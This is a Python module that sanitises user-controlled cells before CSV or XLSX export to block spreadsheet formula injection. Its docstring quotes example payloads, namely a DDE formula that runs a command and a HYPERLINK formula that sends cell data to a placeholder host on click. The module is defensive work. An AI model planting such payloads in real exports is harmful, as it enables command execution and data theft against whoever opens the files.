"""
Spreadsheet Formula Injection Defense (Bug AN — April 2026, expanded).

Excel / LibreOffice / Google Sheets interpret a cell whose first
character is `=`, `+`, `-`, `@`, TAB, CR, LF or any C0 control char as a
*formula*. An attacker who controls any user-facing field that later
gets exported to CSV / XLSX (agency name, guest name, note, OTA
confirmation code, evidence text, description, etc.) can ship payloads
such as:

    =cmd|'/c calc'!A1                   (DDE → arbitrary command on Windows)
    =HYPERLINK("http://x/?"&A1,"ok")    (data exfiltration on click)
    @SUM(1+1)*cmd|'/c calc'!A0          (alt. DDE syntax)

…to anyone who opens the export. `csv.writer` and `openpyxl.Cell.value`
do NOT defend against this — csv only escapes the CSV grammar (commas,
quotes, newlines), and openpyxl actively *parses* a leading `=` as a
real spreadsheet formula.

Use `csv_safe(value)` on every user-controlled cell, or wrap the whole
writer with `safe_writerow(writer, row)`. For openpyxl, assign
`cell.value = csv_safe(value)` instead of the raw value.
"""

from __future__ import annotations

# C0 control chars that some parsers strip before evaluating formulas,
# allowing bypasses like " \t=cmd|...". We treat ANY leading whitespace
# or control char as suspicious and prepend the apostrophe sentinel.
_DANGEROUS_LEAD_CHARS = ("=", "+", "-", "@")
_WHITESPACE_OR_CONTROL = {chr(i) for i in range(0x00, 0x21)} | {"\x7f"}  # 0x21 includes 0x20 space


def csv_safe(value) -> str:
    """Return `value` stringified, with a leading apostrophe prepended
    when the first character could trigger spreadsheet formula
    evaluation. Apostrophe is the OWASP-recommended sentinel — Excel
    treats it as a text escape and hides it from the rendered cell.

    Defends against:
      • Direct formula sigils  =foo  +1  -2  @SUM
      • Whitespace bypasses    " =foo"  "\\t=foo"  "\\n=foo"
      • Control-char bypasses  "\\x01=foo"

    Benign leading whitespace (e.g. "  Antalya") is preserved as-is.
    """
    if value is None:
        return ""
    s = str(value)
    if not s:
        return s
    # Look past any leading whitespace / control chars. Some spreadsheet
    # parsers ignore them before tokenizing, so they're a known bypass.
    stripped = s.lstrip("".join(_WHITESPACE_OR_CONTROL))
    if stripped and stripped[0] in _DANGEROUS_LEAD_CHARS:
        # Drop the leading whitespace so staff see the real payload after
        # the apostrophe (otherwise " =cmd" would render as " =cmd" and
        # still look benign in audit logs).
        return "'" + stripped
    return s


def safe_writerow(writer, row) -> None:
    """`csv.writer.writerow` shim that csv_safe()s every cell."""
    writer.writerow([csv_safe(c) for c in row])


def safe_dict_writerow(writer, row: dict) -> None:
    """`csv.DictWriter.writerow` shim that csv_safe()s every value."""
    writer.writerow({k: csv_safe(v) for k, v in row.items()})


# Alias used in openpyxl call sites for clarity at the call site.
xlsx_safe = csv_safe
